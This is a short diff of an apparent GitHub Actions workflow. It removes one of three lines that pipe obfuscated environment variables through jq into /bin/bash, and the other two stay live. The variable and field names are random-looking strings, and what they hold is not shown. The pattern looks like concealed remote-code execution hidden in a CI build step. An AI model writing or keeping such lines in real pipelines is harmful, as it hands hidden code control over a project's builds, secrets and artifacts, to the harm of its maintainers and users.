@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$ixsx392" | jq -r .tr3 | /bin/bash
           printf '%s' "$nzdqj31551" | jq -r .esqk29 | /bin/bash
-          printf '%s' "$f3816" | jq -r .l46749 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
